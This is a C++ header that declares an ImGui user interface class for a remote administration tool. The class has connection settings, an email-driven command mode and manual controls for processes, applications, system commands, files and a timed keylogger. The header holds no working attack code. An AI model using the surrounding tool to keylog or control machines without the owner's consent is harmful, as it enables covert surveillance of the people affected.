#pragma once
#include "../Types.h"
#include "imgui.h"
#include <vector>
#include <chrono>

class RemoteAdminUI {
private:
    // Connection state
    char serverIP[64] = "127.0.0.1";
    char serverPort[16] = "8888";
    bool isConnected = false;
    std::string connectionStatus = "Disconnected";
    
    // UI state
    UIMode currentMode = UIMode::EMAIL;
    CommandState activeCommand = CommandState::IDLE;
    
    // Email state
    std::string lastEmailCheck = "Never";
    std::string emailStatus = "Idle";
    std::chrono::steady_clock::time_point lastCheckTime;
    
    // Manual command inputs
    char processName[256] = "";
    char appName[256] = "";
    int keyloggerDuration = 30;
    char filePath[512] = "";
    char directoryPath[512] = "";
    
    // Results
    std::vector<ResultMessage> results;

    // Private helper methods
    void HandleConnect();
    void ExecuteCommand(CommandState command);
    void SimulateCommand(const std::string& result, ImVec4 color = Colors::SUCCESS);
    void CheckEmailAutomatically();
    
    // UI Rendering methods
    void RenderConnectionPanel();
    void RenderModeSwitch();
    void RenderEmailMode();
    void RenderManualMode();
    void RenderResults();
    void RenderProcessManagement();
    void RenderApplicationManagement();
    void RenderSystemCommands();
    void RenderMonitoringAndFiles();

public:
    RemoteAdminUI();
    ~RemoteAdminUI();
    
    void AddResult(const std::string& message, ImVec4 color = ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
    void Render();
};